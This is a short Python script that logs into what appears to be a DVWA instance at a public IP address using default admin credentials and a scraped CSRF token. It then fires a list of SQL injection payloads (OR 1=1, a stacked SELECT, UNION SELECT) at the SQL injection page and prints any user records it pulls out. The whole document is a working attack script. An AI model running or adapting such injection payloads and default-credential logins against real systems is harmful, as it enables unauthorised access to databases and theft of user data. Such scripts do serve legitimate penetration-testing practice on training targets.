
import requests
import re
from urllib.parse import quote

session = requests.Session()
url = "http://31.97.117.123"

# Login with admin:password
login_page = session.get(f"{url}/login.php")
match = re.search(r"user_token'\s+value='([^']+)'", login_page.text)
user_token = match.group(1) if match else ""

data = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{url}/login.php", data=data, allow_redirects=True)
print("[+] Login successful!")

# Try different SQL injection payloads
payloads = [
    "1",
    "1 OR 1=1",
    "1' OR '1'='1",
    "admin",
    "1; SELECT * FROM users",
    "1 UNION SELECT 1,2,3,4,5",
]

for payload in payloads:
    print(f"\n[*] Testing payload: {payload}")
    sqli_response = session.get(f"{url}/vulnerabilities/sqli/?id={quote(payload)}")
    
    # Extract the result section
    if "First name:" in sqli_response.text or "Surname:" in sqli_response.text or "User ID" in sqli_response.text:
        # Extract relevant results
        result_match = re.search(r'First name:.*?Surname:.*?User ID:.*?</td>.*?</tr>(.*?)</table>', sqli_response.text, re.DOTALL)
        if result_match:
            print(f"[+] Found result!")
            print(result_match.group(0)[:500])


